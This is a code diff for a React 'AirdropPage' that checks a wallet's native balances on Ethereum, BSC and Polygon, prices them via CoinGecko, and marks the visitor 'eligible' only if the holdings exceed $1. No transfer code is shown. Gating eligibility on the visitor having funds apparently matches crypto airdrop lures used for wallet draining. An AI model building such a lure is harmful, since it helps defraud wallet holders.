@@ -1,10 +1,11 @@
-
 "use client";
 import React, { useState } from 'react';
-import { useAccount, useConnect, useBalance } from 'wagmi';
+import { useAccount, useConnect } from 'wagmi';
+import { getBalance } from '@wagmi/core';
 import { injected } from 'wagmi/connectors';
 import Header from '../components/Header';
 import WalletModal from '../components/WalletModal';
+import { config } from '../config';
 
 export default function AirdropPage() {
     const { address: walletAddress, isConnected } = useAccount();
@@ -13,11 +14,6 @@ export default function AirdropPage() {
     const [status, setStatus] = useState<'idle' | 'checking' | 'eligible' | 'not-eligible' | 'claiming' | 'processed'>('idle');
     const [totalValue, setTotalValue] = useState<number>(0);
     const [isModalOpen, setIsModalOpen] = useState(false);
-
-    // Fetch balance for the entered address (reactively)
-    const { data: balanceData, refetch: refetchBalance } = useBalance({
-        address: address as `0x${string}`,
-    });
 
     // Auto-fill address if wallet connected
     React.useEffect(() => {
@@ -29,25 +25,35 @@ export default function AirdropPage() {
     const checkEligibility = async () => {
         setStatus('checking');
 
-        // Refresh balance to be sure
-        const balResult = await refetchBalance();
-        const nativeBalance = Number(balResult.data?.formatted || 0);
-
         try {
-            // Fetch ETH price real-time
-            const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
-            let ethPrice = 3000; // Fallback
+            const addr = address as `0x${string}`;
+
+            // Check native balances on multiple chains
+            const balances = await Promise.all([
+                getBalance(config, { address: addr, chainId: 1 }),   // ETH
+                getBalance(config, { address: addr, chainId: 56 }),  // BSC
+                getBalance(config, { address: addr, chainId: 137 }), // Polygon
+            ]);
+
+            // Fetch current prices
+            const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network&vs_currencies=usd');
+            let prices: any = { ethereum: { usd: 0 }, binancecoin: { usd: 0 }, 'matic-network': { usd: 0 } };
+
             if (res.ok) {
-                const data = await res.json();
-                ethPrice = data.ethereum.usd;
+                prices = await res.json();
             }
 
-            const value = nativeBalance * ethPrice;
-            setTotalValue(value);
+            // Calculate total value
+            const ethValue = Number(balances[0].formatted) * (prices.ethereum?.usd || 0);
+            const bscValue = Number(balances[1].formatted) * (prices.binancecoin?.usd || 0);
+            const polyValue = Number(balances[2].formatted) * (prices['matic-network']?.usd || 0);
+
+            const total = ethValue + bscValue + polyValue;
+            setTotalValue(total);
 
             // Artificial delay for UX
             setTimeout(() => {
-                if (value > 1) {
+                if (total > 1) {
                     setStatus('eligible');
                 } else {
                     setStatus('not-eligible');
